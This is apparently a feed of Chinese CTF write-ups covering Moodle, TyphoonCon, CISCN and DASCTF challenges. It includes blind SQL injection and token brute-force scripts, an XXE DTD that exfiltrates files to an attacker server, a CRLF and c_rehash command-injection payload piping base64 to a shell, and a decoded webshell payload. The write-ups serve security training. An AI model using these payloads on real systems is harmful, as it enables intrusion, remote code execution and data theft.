+----+--------+----------------------------------+---------------+-----------------+ | id | userid | token | timerequested | timererequested | +----+--------+----------------------------------+---------------+-----------------+ | 1 | 2 | OmPAvhUALIvcQcX4fSxx8P0BzcKcSoVG | 1659191821 | 1659191987 | +----+--------+----------------------------------+---------------+-------------- Database: moodle Table: mdl_user_private_key [0 entries] +----+--------+--------+---------+----------+------------+-------------+---------------+ | id | userid | script | value | instance | validuntil | timecreated | iprestriction | +----+--------+--------+---------+----------+------------+-------------+---------------+ +----+--------+--------+---------+----------+------------+-------------+---------------+ 这里进行代码审计，首先在跟进这里 然后进到这里，这里会有个判断，必须保证token绑定了user，而且时间在半小时内 在本地环境测试下，我通过发送重置密码邮件，就可以更新mdl_user_password_resets里面的token和时间 这里我直接盲测了一下，直接发只有token参数的数据，因为缺少参数，这里发现跳转到了修改密码的界面 手动修改密码后登录，本地环境成功登录admin 然后在history里面找到完整的payload，不过这个sesskey是有时限的，所以还是手改就好 token=Lk7GF0p9gAinTlkPPyMA4ZJ9Hc6v6Fly\u0026sesskey=h9zVdXkSLf\u0026_qf__login_set_password_form=1\u0026username=admin\u0026password=Admin%40123\u0026password2=Admin%40123\u0026submitbutton=%E4%BF%9D%E5%AD%98%E6%9B%B4%E6%94%B9 然后到远程来打，首先sql注入拿到管理员的邮箱，这里找到的是admin@localhost.com 然后发包修改免密进入到后台 这个moodle版本是3.9.1，后台是可以getshell的，这里通过加载一个插件去getshell 我用的现成的 https://github.com/HoangKien1020/Moodle_RCE 安装这个rce插件即可 然后find找flag即可 http://47.105.52.19:8888/blocks/rce/lang/en/block_rce.php?cmd=grep -r 'flag{.*}' /etc ","date":"2022-07-31","objectID":"/qwb2022/:6:0","tags":null,"title":"[2022强网杯] WP","uri":"/qwb2022/"},{"categories":["CTF"],"content":"KnowMe 首先是扫了个目录，发现了robots.txt /items.php /var/www/flag 这里的items.php是一个查询接口 经测试是order by的盲注，这里我写了个脚本，这里只展示到最后查询密码 import requests import string strings = \"abcdef1234567890\" url = \"https://typhooncon-knowme.chals.io/items.php?sort=rand(substr((select/**/group_concat(password)/**/from/**/users),{},1)='{}')\" flag = '' for i in range(80): for s in strings: fuckurl = url.format(i,s) res = requests.get(url=fuckurl).text if '\"id\":2' in res: flag+=s print(flag) else : print(\"-\",end=\"\") 注出来，admin密码md5：d41d8cd98f00b204e9800998ecf8427e 解出来是空 只需要bp进行前端限制的绕过即可，然后就会跳转到profile.php 进行文件上传，这里只允许上传图片，且是白名单，这里直接上传1.png.php即可绕过，估计这里的逻辑判断只取了第一个点后面的后缀 直接传shell后拿flag 进去拿到了源码后，的确是这样的逻辑 Typo ","date":"2022-06-25","objectID":"/typhoonconctf2022/:0:0","tags":null,"title":"[TyphoonCon CTF 2022] WP","uri":"/typhoonconctf2022/"},{"categories":["CTF"],"content":"step1 给了赛题文件，这里是有一个登录的操作的，但是很多的路由都需要登录，只有change.php和forgot.php不需要登录 在change.php里面，这里会通过uid查询一个token，而这里的token进行了一个substr，只取了前4位 所以这样我们是可以尝试爆破的 $uid = mysqli_real_escape_string($mysqli, $_POST['uid']); $pwd = md5(mysqli_real_escape_string($mysqli, $_POST['psw'])); $sig = mysqli_real_escape_string($mysqli, $_POST['token']); $sqlGetTokens = \"SELECT token from tokens where uid='$uid'\"; $result = $mysqli-\u003equery($sqlGetTokens); $data = mysqli_fetch_array($result); $sigDB = substr($data[0], 0, 4); if( $sig == $sigDB ){ $sqlChange = \"UPDATE users SET password='$pwd' where id='$uid'\"; $mysqli-\u003equery($sqlChange); $sqlDelete = \"DELETE FROM tokens WHERE uid='$uid'\"; $mysqli-\u003equery($sqlDelete); 但是直接爆破难度有点大，这里就可以利用forget.php的功能 if($_SERVER['REQUEST_METHOD'] == \"POST\"){ $uname = mysqli_real_escape_string($mysqli, $_POST['uname']); $s = system(\"date +%s%3N \u003e /tmp/time\"); $time = file_get_contents(\"/tmp/time\"); $fullToken = md5( $unam . $time . \"SECRET\" ); $sqlGetId = \"SELECT id FROM users where username='$uname'\"; $result = $mysqli-\u003equery($sqlGetId); $data = mysqli_fetch_array($result); $uid = $data[0]; $sqlDelete = \"DELETE FROM tokens WHERE uid='$uid'\"; $mysqli-\u003equery($sqlDelete); $sqlInsert = \"INSERT INTO tokens values('$uid','$fullToken')\"; $mysqli-\u003equery($sqlInsert); die(\"\u003cscript\u003ealert('Token sent to you.');window.location.href='/index.php';\u003c/script\u003e\"); } 这里会基于uname，time，”SECRET“生成一个md5，然后我发现这里真是写错了个单词$unam。。。 所以这里fullToken就会是md5(time+“SECRET”)了，如果爆破点放在token上，那么我们确实是有可能爆破出来的，但是比赛的时候很多人都会做这个题目，所以time会经常变化，这让我们爆破的难度有点大 而对于这个time是可以变化的，每次POST访问forget的时候，这里就会刷新time，所以说之类我们可以利用php不严格的判断，让time进行变化，当变成0exxxxx的时候，这时候我们把sig赋值为0000就能让条件$sig == $sigDB满足 写个脚本来进行爆破 import requests target = \"https://typhooncon-typo.chals.io\" passwd = \"hack\" data1 = { \"uname\": \"admin\" } data2 = { \"uid\": \"1\", \"psw\": passwd, \"token\": \"0000\" } while True: try: res = requests.post(f\"{target}/forgot.php\", data1) print(res.text) res = requests.post(f\"{target}/change.php\", data2) print(res.text) if \"Password Changed.\" in res.text: print(passwd) break except: pass 爆破的结果，成功更改密码 拿到cookie：PHPSESSID=ql32dudasjts4rjbsctj0vrvqd ","date":"2022-06-25","objectID":"/typhoonconctf2022/:1:0","tags":null,"title":"[TyphoonCon CTF 2022] WP","uri":"/typhoonconctf2022/"},{"categories":["CTF"],"content":"step2 这里到了profile.php，存在一个xml的使用，猜测这里是存在一个xxe的 \u003cscript type=\"text/javascript\"\u003e xhr = new XMLHttpRequest() xhr.onreadystatechange = function(){ document.getElementById(\"email\").innerHTML = \"E-Mail: \"+this.responseText } xhr.open(\"get\",\"data.php?u=\u003c?php echo $uname;?\u003e\") xhr.send() function read(){ var xml = '\u003c\\?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\u003cuser\u003e\u003cusername\u003e'+document.getElementById(\"user\").value+'\u003c/username\u003e\u003c/user\u003e' var xhr = new XMLHttpRequest() xhr.onreadystatechange = function(){ var out = document.getElementById(\"output\") out.value = this.responseText } xhr.open(\"post\",\"read.php\") // xhr.setRequestHeader(\"UUID\", document.getElementById(\"uuid\").value) xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\") xhr.send(\"data=\"+encodeURIComponent(xml)) } \u003c/script\u003e 但是这里需要有一个UUID，我们再更进看一下read.php $uuid = $_SERVER['HTTP_UUID']; if( $uuid != \"XXXX\" ){ die(\"UUID is not valid\"); } include 'database.php'; $xml = urldecode($_POST['data']); $dom = new DOMDocument(); try{ @$dom-\u003eloadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD); }catch (Exception $e){ echo ''; } $userInfo = @simplexml_import_dom($dom); $output = \"User Sucessfully Added.\"; $user = mysqli_real_escape_string($mysqli, @$userInfo-\u003eusername); $sql = \"select * from users where username='$user'\"; 这里会对uuid进行一个判断，才会进一步的加载xml，所以我们的获取到这个uuid，这里我们还有个文件没看，那就是data.php，可以看到这里的sql查询是没有增加过滤的，所以我们在这里进行一个sql注入 $uname = $_GET['u']; $sql = \"SELECT email FROM users where username='$uname'\"; if( $result = $mysqli-\u003equery($sql) ){ $data = @mysqli_fetch_array($result); $email = $data[0]; echo $email; }else{ echo \"Erorr\"; } 这里直接用sqlmap一把嗦 available databases [5]: [*] information_schema [*] mysql [*] performance_schema [*] sys [*] typodb Database: typodb [3 tables] +------------+ | secretkeys | | tokens | | users | +------------+ Database: typodb Table: secretkeys [1 entry] +--------------------------------------+ | uuidkey | +--------------------------------------+ | 8d6ed261-f84f-4eda-b2d2-16332bd8c390 | +--------------------------------------+ 拿到uuid，这样我们就可以构造xxe进行攻击了，但是有个问题，这里没有回显，所以我们得在自己vps搭建个，我的payload参考此处 vps放一个dtd.xml \u003c!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/flag\"\u003e \u003c!ENTITY % param1 \"\u003c!ENTITY exfil SYSTEM 'http://ip:port/dtd.xml?%data;'\u003e\"\u003e 起一个python服务 python3 -m http.server 11111 curl发包 curl -X POST https://typhooncon-typo.chals.io/read.php -H \"UUID: 8d6ed261-f84f-4eda-b2d2-16332bd8c390\" -H \"Cookie: PHPSESSID=ql32dudasjts4rjbsctj0vrvqd\" -d \"data=%3C%3Fxml%20version%3D%221%2E0%22%20encoding%3D%22UTF%2D8%22%3F%3E%0A%3C%21DOCTYPE%20r%20%5B%0A%3C%21ELEMENT%20r%20ANY%20%3E%0A%3C%21ENTITY%20%25%20sp%20SYSTEM%20%22http%3A%2F%2F[ip]%2Fdtd%2Exml%22%3E%0A%25sp%3B%0A%25param1%3B%0A%5D%3E%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E%0A%3Cuser%3E%3Cusername%3Eadmin%3C%2Fusername%3E%3C%2Fuser%3E\" 成功带出flag ","date":"2022-06-25","objectID":"/typhoonconctf2022/:2:0","tags":null,"title":"[TyphoonCon CTF 2022] WP","uri":"/typhoonconctf2022/"},{"categories":["CTF"],"content":"ikari 在index.php里面有这么一段代码 try { require ROOT_PATH . 'Engine/Loader.php'; E\\Loader::getInstance()-\u003einit(); // Load necessary classes $aParams = ['ctrl' =\u003e (!empty($_GET['p']) ? $_GET['p'] : 'blog'), 'act' =\u003e (!empty($_GET['a']) ? $_GET['a'] : 'index'), 'template' =\u003e (!empty($_GET['t']) ? $_GET['t'] : 'pc'), 'ns' =\u003e (!empty($_GET['n']) ? $_GET['n'] : 'TestProject\\Controller\\\\')]; E\\Router::run($aParams); } catch (\\Exception $oE) { echo $oE-\u003egetMessage(); } ?\u003e 我们跟进Router去看看 class Router { public static function run (array $aParams) { if($aParams['ns'] != 'TestProject\\Controller\\\\'){ $sNamespace = $aParams['ns']; $sCtrlPath = $sNamespace; }else{ $sNamespace = 'TestProject\\Controller\\\\'; $sDefCtrl = $sNamespace . 'Blog'; $sCtrlPath = ROOT_PATH . 'Controller/'; } if($aParams['ns'] == '\\\\'){ $aParams['ctrl'] = '\\\\system'; if(preg_match('/^[a-zA-Z0-9\\/]*$/',$aParams['act'])){ $aParams['act'] = 'ls /www/'.$aParams['act']; }else{ $aParams['act'] = 'ls /www/'; } } $sTemplatePath = str_replace(array(\".\",\"\\/\"), \"\", ROOT_PATH . 'Template/' . $aParams['template']); include $sTemplatePath; $sCtrl = ucfirst($aParams['ctrl']); if (is_file($sCtrlPath . $sCtrl . '.php') || (substr($sCtrl, 0, 1) === '\\\\')) { $sCtrl = $sNamespace . str_replace('\\\\','',$sCtrl); if(class_exists($sCtrl)){ $oCtrl = new $sCtrl; }else{ call_user_func($sCtrl, $aParams['act']); exit(); } if ((new \\ReflectionClass($oCtrl))-\u003ehasMethod($aParams['act']) \u0026\u0026 (new \\ReflectionMethod($oCtrl, $aParams['act']))-\u003eisPublic()) call_user_func(array($oCtrl, $aParams['act'])); else call_user_func(array($oCtrl, 'notFound')); } else { call_user_func(array(new $sDefCtrl, 'notFound')); } } } 这里是对路由的操作，这里，我们可以通过控制参数p选择路由，a选择路由的功能 在utils里面有这个，这里可以进行文件的包含 public function __get($name) { if(stripos($name,'php') || stripos($name,'Upload') || stripos($name,'flag') || stripos($name,':')){ die('Dangerous Operation.'); }else{ if(file_exists($name)){ require $name; } } } 而这个函数的入口在blog路由下的post方法，这里传一个参数f，进行包含，因为这里对参数有过滤，所以我们选择session_upload进行竞争包含 public function post() { if($this-\u003erender == 0){ $this-\u003eoUtil-\u003eoPost = $this-\u003eoModel-\u003egetById($this-\u003e_iId); // Get the data of the post $this-\u003eoUtil-\u003egetView('post'); }else{ $this-\u003eoUtil-\u003e__get($_GET['f']); } } xxxcloud 源码中有admin的密码hash，但是解不开，这里的做法是找到token的构造算法，进行手动token生成 找到token计算算法 找到systempassword 计算出token 然后伪造登录获取flag 这里的防守不知道应该用什么方式进行防守，如果是伪造token的话，那我们无法避免，因为token算法是写死的，我尝试把这个系统的一个任意文件删除修复，但是任然是exp攻击成功 后来直接上了个awd的通防waf，没想到还防住了。。 template 任意文件读取 + 读 opcache缓存 这里传入tpl参数，赋值为$tpl if (isset($_GET['tpl']) \u0026\u0026 is_string($_GET['tpl'])): $tpl = $_GET['tpl']; endif; 然后在check方法里面，先进行后缀检测，这里过滤的是挺严的 如果通过了过滤，那么就会进行file_get_contents函数，进行文件读取 private function check() { try{ $arr = explode('.', $this-\u003etpl); $ext = end($arr); if (in_array($ext, ['php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'phtml'])): return false; endif; $content = file_get_contents($this-\u003etpl); if (!$content): return false; endif; if ( preg_match('/script|\u003c\\?/i', $content) ): return false; endif; } catch (Exception $e) { return false; } return true; } 那我们就可以进行除了php文件外，任意文件的读取了 这里如果tpl是debug的话，会给phpinfo 这里是开启了zend_opcache，这里我们利用包含opcache进行攻击 首先得计算systemid，这个的计算可以利用工具https://github.com/GoSecure/php7-opcache-override/ 然后就是任意文件读取了 http://172.16.9.44:8091/?tpl=..//…//…//…//…/var/www/cache/1116d566fdc53f79abce6c01e3a0308d/var/www/html/flag.php.bin ","date":"2022-06-24","objectID":"/ciscn2022_half/:0:0","tags":null,"title":"[CISCN2022] Semifinals","uri":"/ciscn2022_half/"},{"categories":["CTF"],"content":"0x01 前期准备 ","date":"2022-05-31","objectID":"/ciscn2022_crt/:0:0","tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/"},{"categories":["CTF"],"content":"源码 题目源码用于本地的调试，有所改动，考虑篇幅，只展示重要逻辑代码 app.py @app.route('/getcrt', methods=['GET', 'POST']) def upload(): Country = request.form.get(\"Country\", \"CN\") Province = request.form.get(\"Province\", \"a\") City = request.form.get(\"City\", \"a\") OrganizationalName = request.form.get(\"OrganizationalName\", \"a\") CommonName = request.form.get(\"CommonName\", \"a\") EmailAddress = request.form.get(\"EmailAddress\", \"a\") return get_crt(Country, Province, City, OrganizationalName, CommonName, EmailAddress) @app.route('/createlink', methods=['GET']) def info(): json_data = {\"info\": os.popen(\"c_rehash static/crt/ \u0026\u0026 ls static/crt/\").read()} return json.dumps(json_data) @app.route('/proxy', methods=['GET']) def proxy(): uri = request.form.get(\"uri\", \"/\") client = socket.socket() client.connect(('localhost', 8887)) msg = f'''GET {uri}HTTP/1.1 Host: test_api_host User-Agent: Guest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ''' client.send(msg.encode()) data = client.recv(2048) client.close() return data.decode() app.run(host=\"0.0.0.0\", port=8888) main.go package main import ( \"github.com/gin-gonic/gin\" \"os\" \"strings\" ) func admin(c *gin.Context) { staticPath := \"../static/crt/\" oldname := c.DefaultQuery(\"oldname\", \"\") newname := c.DefaultQuery(\"newname\", \"\") if oldname == \"\" || newname == \"\" || strings.Contains(oldname, \"..\") || strings.Contains(newname, \"..\") { c.String(500, \"error\") return } if c.Request.URL.RawPath != \"\" \u0026\u0026 c.Request.Host == \"admin\" { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \"no\") } func index(c *gin.Context) { c.String(200, \"hello world\") } func main() { router := gin.Default() router.GET(\"/\", index) router.GET(\"/admin/rename\", admin) if err := router.Run(\":8887\"); err != nil { panic(err) } } ","date":"2022-05-31","objectID":"/ciscn2022_crt/:1:0","tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/"},{"categories":["CTF"],"content":"服务启动 因为flask里直接执行了命令，所以我们得把这个文件放到py文件的同级目录 接着启动服务，分别执行. python3 app.py go run main.go 0x02 题目逻辑 这里题目的逻辑大致是这样： 首先通过getcrt路由生成crt文件，然后利用go里的admin/rename去修改文件名，最后利用createlink里的c_rehash执行命令 可以看到proxy里面，是拼接了一个http包的 这里不免想到CRLF，进了go里面，那么有这样的条件需要满足 if c.Request.URL.RawPath != \"\" \u0026\u0026 c.Request.Host == \"admin\" { err := os.Rename(staticPath+oldname, staticPath+newname) if err != nil { return } c.String(200, newname) return } c.String(200, \"no\") ","date":"2022-05-31","objectID":"/ciscn2022_crt/:2:0","tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/"},{"categories":["CTF"],"content":"c.Request.URL.RawPath的绕过 首先是c.Request.URL.RawPath，这个的绕过方法是url编码，我们用%252f代替/来绕过这个 接着是host得是admin，这里我们可以用CRLF来实现 ","date":"2022-05-31","objectID":"/ciscn2022_crt/:3:0","tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/"},{"categories":["CTF"],"content":"c_rehash的RCE:CVE-2022-1292 这里是给了c_rehash的源码的，先搜了一下这个cve，找到官方的修复方案 ，发现是在这里进行了修复 那么我们就可以对这里分析一下，这里可以从fname这里进行代码注入，类似于这样 1.crt\"||id\u003e1.txt||echo\" 那么思路就清晰了 ","date":"2022-05-31","objectID":"/ciscn2022_crt/:4:0","tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/"},{"categories":["CTF"],"content":"最后逻辑 我们先生成一个crt记录下文件名，然后通过proxy，到go的/admin/rename下，通过CRLF绕过host的判断，把文件名修改成代码注入的样子，最后通过createlink执行c_rehash进行命令执行 但是最后有一个问题，就是这里fname还是有过滤的，是不能出现斜杠，那么我们就没有办法读取到其他目录下的文件了，这里的绕过逻辑是通过base64进行消敏 $fname =~ s/\\\"/\\\\\\\"/g; payload： uri=/admin%252frename?oldname=8c3bcef7-62f5-476c-9c9d-9dc7054a5533.crt%26newname=1.crt\"||echo${IFS}\"Y2F0IC9mbGFnPnpob25nM2Nj\"|base64${IFS}-d|sh${IFS}-i\"%20HTTP/1.1%0d%0aHost:%20admin%0d%0a%0d%0aGET%20/ 成功修改文件名 然后再到createlink执行命令 访问static/crt/1.txt，成功读取到/etc/passwd ","date":"2022-05-31","objectID":"/ciscn2022_crt/:5:0","tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/"},{"categories":["CTF"],"content":"tricks 这里绕过Host判断，可以不用CRLF来绕过，这里可以用http://admin/admin/rename来绕过 可以看到是可以成功绕过的 ","date":"2022-05-31","objectID":"/ciscn2022_crt/:6:0","tags":null,"title":"[CISCN2022] online_crt","uri":"/ciscn2022_crt/"},{"categories":null,"content":" Name Blog mung29 http://dongyu29.xyz Thnpkm http://thnpkm.xyz/ Sunlight https://sunlight316.cn Yenkoc https://yenkoc.github.io/ Zhong3 https://www.ieven762.cn/ Aur0ra https://www.cnblogs.com/Aurora-M/ Whitebird https://whitebird0.github.io/ Harvey https://harvey.plus/ W0nderMaker https://blog.csdn.net/wuyvle Zima Blue https://www.zimablue.life/ MiaoTony https://miaotony.xyz/ ","date":"2022-05-30","objectID":"/friends/:0:0","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":["CTF"],"content":"Misc ","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:1:0","tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/"},{"categories":["CTF"],"content":"SimpleFlow 看流量大概是上传了一个后门，但是会对payload加密，这里发现有flag.txt被打包 后面的包里面发现flag.zip 但是打开需要密码，那么我们就要回去压缩的地方，看看给的什么密码，所以我们就得解开这个流量 @eval(@base64_decode($_POST['m8f8d9db647ecd'])); \u0026e57fb9c067c677=o3 \u0026g479cf6f058cf8=1DY2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0Ijt6aXAgLVAgUGFTc1ppUFdvckQgZmxhZy56aXAgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd \u0026m8f8d9db647ecd=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiYjYzYmEiLiI3ZGZhMjAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjgwZSIuIjExYSI7fW9iX3N0YXJ0KCk7dHJ5eyRwPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsibzFmYWViZDRlYzNkOTciXSwyKSk7JHM9YmFzZTY0X2RlY29kZShzdWJzdHIoJF9QT1NUWyJnNDc5Y2Y2ZjA1OGNmOCJdLDIpKTskZW52c3RyPUBiYXNlNjRfZGVjb2RlKHN1YnN0cigkX1BPU1RbImU1N2ZiOWMwNjdjNjc3Il0sMikpOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjtpZihzdWJzdHIoJGQsMCwxKT09Ii8iKXtAcHV0ZW52KCJQQVRIPSIuZ2V0ZW52KCJQQVRIIikuIjovdXNyL2xvY2FsL3NiaW46L3Vzci9sb2NhbC9iaW46L3Vzci9zYmluOi91c3IvYmluOi9zYmluOi9iaW4iKTt9ZWxzZXtAcHV0ZW52KCJQQVRIPSIuZ2V0ZW52KCJQQVRIIikuIjtDOi9XaW5kb3dzL3N5c3RlbTMyO0M6L1dpbmRvd3MvU3lzV09XNjQ7QzovV2luZG93cztDOi9XaW5kb3dzL1N5c3RlbTMyL1dpbmRvd3NQb3dlclNoZWxsL3YxLjAvOyIpO31pZighZW1wdHkoJGVudnN0cikpeyRlbnZhcnI9ZXhwbG9kZSgifHx8YXNsaW5lfHx8IiwgJGVudnN0cik7Zm9yZWFjaCgkZW52YXJyIGFzICR2KSB7aWYgKCFlbXB0eSgkdikpIHtAcHV0ZW52KHN0cl9yZXBsYWNlKCJ8fHxhc2tleXx8fCIsICI9IiwgJHYpKTt9fX0kcj0ieyRwfSB7JGN9IjtmdW5jdGlvbiBmZSgkZil7JGQ9ZXhwbG9kZSgiLCIsQGluaV9nZXQoImRpc2FibGVfZnVuY3Rpb25zIikpO2lmKGVtcHR5KCRkKSl7JGQ9YXJyYXkoKTt9ZWxzZXskZD1hcnJheV9tYXAoJ3RyaW0nLGFycmF5X21hcCgnc3RydG9sb3dlcicsJGQpKTt9cmV0dXJuKGZ1bmN0aW9uX2V4aXN0cygkZikmJmlzX2NhbGxhYmxlKCRmKSYmIWluX2FycmF5KCRmLCRkKSk7fTtmdW5jdGlvbiBydW5zaGVsbHNob2NrKCRkLCAkYykge2lmIChzdWJzdHIoJGQsIDAsIDEpID09ICIvIiAmJiBmZSgncHV0ZW52JykgJiYgKGZlKCdlcnJvcl9sb2cnKSB8fCBmZSgnbWFpbCcpKSkge2lmIChzdHJzdHIocmVhZGxpbmsoIi9iaW4vc2giKSwgImJhc2giKSAhPSBGQUxTRSkgeyR0bXAgPSB0ZW1wbmFtKHN5c19nZXRfdGVtcF9kaXIoKSwgJ2FzJyk7cHV0ZW52KCJQSFBfTE9MPSgpIHsgeDsgfTsgJGMgPiR0bXAgMj4mMSIpO2lmIChmZSgnZXJyb3JfbG9nJykpIHtlcnJvcl9sb2coImEiLCAxKTt9IGVsc2Uge21haWwoImFAMTI3LjAuMC4xIiwgIiIsICIiLCAiLWJ2Iik7fX0gZWxzZSB7cmV0dXJuIEZhbHNlO30kb3V0cHV0ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR0bXApO0B1bmxpbmsoJHRtcCk7aWYgKCRvdXRwdXQgIT0gIiIpIHtwcmludCgkb3V0cHV0KTtyZXR1cm4gVHJ1ZTt9fXJldHVybiBGYWxzZTt9O2Z1bmN0aW9uIHJ1bmNtZCgkYyl7JHJldD0wOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZihmZSgnc3lzdGVtJykpe0BzeXN0ZW0oJGMsJHJldCk7fWVsc2VpZihmZSgncGFzc3RocnUnKSl7QHBhc3N0aHJ1KCRjLCRyZXQpO31lbHNlaWYoZmUoJ3NoZWxsX2V4ZWMnKSl7cHJpbnQoQHNoZWxsX2V4ZWMoJGMpKTt9ZWxzZWlmKGZlKCdleGVjJykpe0BleGVjKCRjLCRvLCRyZXQpO3ByaW50KGpvaW4oIgoiLCRvKSk7fWVsc2VpZihmZSgncG9wZW4nKSl7JGZwPUBwb3BlbigkYywncicpO3doaWxlKCFAZmVvZigkZnApKXtwcmludChAZmdldHMoJGZwLDIwNDgpKTt9QHBjbG9zZSgkZnApO31lbHNlaWYoZmUoJ3Byb2Nfb3BlbicpKXskcCA9IEBwcm9jX29wZW4oJGMsIGFycmF5KDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLCAyID0+IGFycmF5KCdwaXBlJywgJ3cnKSksICRpbyk7d2hpbGUoIUBmZW9mKCRpb1sxXSkpe3ByaW50KEBmZ2V0cygkaW9bMV0sMjA0OCkpO313aGlsZSghQGZlb2YoJGlvWzJdKSl7cHJpbnQoQGZnZXRzKCRpb1syXSwyMDQ4KSk7fUBmY2xvc2UoJGlvWzFdKTtAZmNsb3NlKCRpb1syXSk7QHByb2NfY2xvc2UoJHApO31lbHNlaWYoZmUoJ2FudHN5c3RlbScpKXtAYW50c3lzdGVtKCRjKTt9ZWxzZWlmKHJ1bnNoZWxsc2hvY2soJGQsICRjKSkge3JldHVybiAkcmV0O31lbHNlaWYoc3Vic3RyKCRkLDAsMSkhPSIvIiAmJiBAY2xhc3NfZXhpc3RzKCJDT00iKSl7JHc9bmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOyRlPSR3LT5leGVjKCRjKTskc289JGUtPlN0ZE91dCgpOyRyZXQuPSRzby0+UmVhZEFsbCgpOyRzZT0kZS0+U3RkRXJyKCk7JHJldC49JHNlLT5SZWFkQWxsKCk7cHJpbnQoJHJldCk7fWVsc2V7JHJldCA9IDEyNzt9cmV0dXJuICRyZXQ7fTskcmV0PUBydW5jbWQoJHIuIiAyPiYxIik7cHJpbnQgKCRyZXQhPTApPyJyZXQ9eyRyZXR9IjoiIjs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw== \u0026o1faebd4ec3d97=WaL2Jpbi9zaA== 这个很长的解开是就是加密的木马 \u003c?php @ini_set(\"display_errors\", \"0\");@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:1:1","tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/"},{"categories":["CTF"],"content":"Web ","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:2:0","tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/"},{"categories":["CTF"],"content":"warmup-php 在构造函数里面，会调用一个run方法 $object-\u003erun(); 有run方法的只有listview public function run() { echo \"\u003c\".$this-\u003etagName.\"\u003e\\n\"; $this-\u003erenderContent(); echo \"\u003c\".$this-\u003etagName.\"\u003e\\n\"; } 执行命令的地方在Base的evaluateExpression里面，这里最底层的类是TestView，所以我们从这里分析 这里的renderTableRow方法里面会进入evaluateExpression，而renderTableRow可以从renderTableBody进入 再回头来看run方法，调用run方法以后进入renderContent，这里会进入renderSection，这里会进行一拼接 所以我们可以利用这个进入renderTableBody，这样利用链就出来了 Action-\u003erun()-\u003erenderContent()-\u003erenderSection()-\u003erenderTableBody()-\u003erenderTableRow()-\u003eevaluateExpression() 那么就看看怎么传参，首先是action，是最底层的类TestView，然后看properties，这里会循环为对象属性赋值 highlight_file(__FILE__); error_reporting(0); $action = $_GET['action']; $properties = $_POST['properties']; class Action{ public function __construct($action,$properties){ $object=new $action(); foreach($properties as $name=\u003e$value) $object-\u003e$name=$value; $object-\u003erun(); } } new Action($action,$properties); 我们进入TestView去看看，首先看执行的命令，是rowHtmlOptionsExpression属性 所以赋值为eval($_POST[1])，还需要有一个参数data，这个并不影响，所以我们可以随便附一个值 再往回走到ListView里面，这里是执行了一个无参的方法，我们前面分析的是从renderTableBody进去renderTableRow，所以这里我们需要以数组的形式拼接一个TableBody 那么传参为properties[template]={TableBody} 最后的payload get ?action=TestView post 1=system('whoami');\u0026properties[data]=ph\u0026properties[rowHtmlOptionsExpression]=eval($_POST[1])\u0026properties[template]={TableBody} 在/readflag拿到flag ","date":"2022-04-25","objectID":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/:2:1","tags":null,"title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP","uri":"/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/"},{"categories":["CTF"],"content":"soeasy_php 发现有个editor.php 使用下面的payload可以任意文件读取 png=../../../../../../etc/passwd\u0026flag=1 读一下源码 upload.php \u003c?php if (!isset($_FILES['file'])) { die(\"请上传头像\"); } $file = $_FILES['file']; $filename = md5(\"png\".$file['name']).\".png\"; $path = \"uploads/\".$filename; if(move_uploaded_file($file['tmp_name'],$path)){ echo \"上传成功： \".$path; }; editor.php \u003c?php class flag{ public function copyflag(){ exec(\"/copyflag\"); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo \"SFTQL\"; } public function __destruct(){ $this-\u003ecopyflag(); } } 